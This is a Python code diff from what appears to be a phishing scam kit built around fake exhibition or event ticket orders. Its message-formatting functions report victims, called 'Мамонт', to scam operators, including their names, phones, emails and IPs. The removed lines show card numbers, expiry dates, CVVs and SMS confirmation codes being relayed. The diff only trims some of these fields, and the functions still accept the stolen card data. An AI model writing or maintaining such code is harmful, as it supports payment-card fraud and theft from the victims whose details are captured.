@@ -86,10 +86,10 @@ def get_event_name_from_page_code(page_code):
         return "Выставка"
     
     try:
-        # Шукаємо page_code в URL
-        match = re.search(r'page=(\d+-\d+)', page_code)
+        # page_code вже є кодом (наприклад, "2-57"), шукаємо першу цифру
+        match = re.search(r'^(\d+)-\d+', page_code)
         if match:
-            series = int(match.group(1).split('-')[0])
+            series = int(match.group(1))
             event_names = [
                 "Terroir and Traditions",
                 "Collection Co–selection", 
@@ -654,11 +654,7 @@ def format_order_start_message(page_code, name, phone, email, ip, price, currenc
     
     message = (
         f"🔔 Мамонт оформляет заказ {event_name}\n\n"
-        f"#️⃣ Ссылка: ?page={page_code or 'Не указано'}\n"
         f"👤 Мамонт: {name or 'Не указано'}\n"
-        f"📱 Телефон: {phone or 'Не указано'}\n"
-        f"📧 Email: {email or 'Не указано'}\n"
-        f"🌍 IP: {ip or 'Не указано'}\n"
         f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}"
     )
     
@@ -672,29 +668,13 @@ def format_code_request_message(admin_username, name, price, currency, page_code
     
     message = f"🔔 Отправлен запрос на код {event_name}\n\n"
     
-    # Вбивер (власник посилання)
-    if admin_username:
-        message += f"🧑‍🏭 Вбивер: @{admin_username}\n"
-    else:
-        message += f"🧑‍🏭 Вбивер: @Не указано\n"
-    
     # Мамонт (ФІО користувача) - завжди показуємо, якщо є
     if name:
-        message += f"🐘 Мамонт: {name}\n"
+        message += f"👤 Мамонт: {name}\n"
     
     # Сума - тільки якщо є
     if price and price != 'Не указано' and price != 'N/A':
-        message += f"💰 Общая сумма: {price}{currency or ''}\n"
-    
-    # Сторінка
-    if page_code:
-        message += f"#️⃣ Ссылка: ?page={page_code}\n"
-    else:
-        message += f"#️⃣ Ссылка: ?page=Не указано\n"
-    
-    # Код - тільки якщо є
-    if code_value:
-        message += f"🔐 Код: {code_value}"
+        message += f"💰 Общая сумма: {price}{currency or ''}"
     
     return message
 
@@ -706,13 +686,8 @@ def format_card_payment_message(page_code, name, price, currency, card_number, c
     
     message = (
         f"🔔 Мамонт ввел карту {event_name}\n\n"
-        f"#️⃣ Ссылка: ?page={page_code or 'Не указано'}\n"
         f"👤 Мамонт: {name or 'Не указано'}\n"
-        f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}\n"
-        f"💳 Номер карты: {card_number or 'Не указано'}\n"
-        f"📅 Срок действия: {expiry or 'Не указано'}\n"
-        f"🔐 CVV: {cvv or 'Не указано'}\n"
-        f"🌍 Страна карты: {country or 'Не указано'}"
+        f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}"
     )
     
     return message
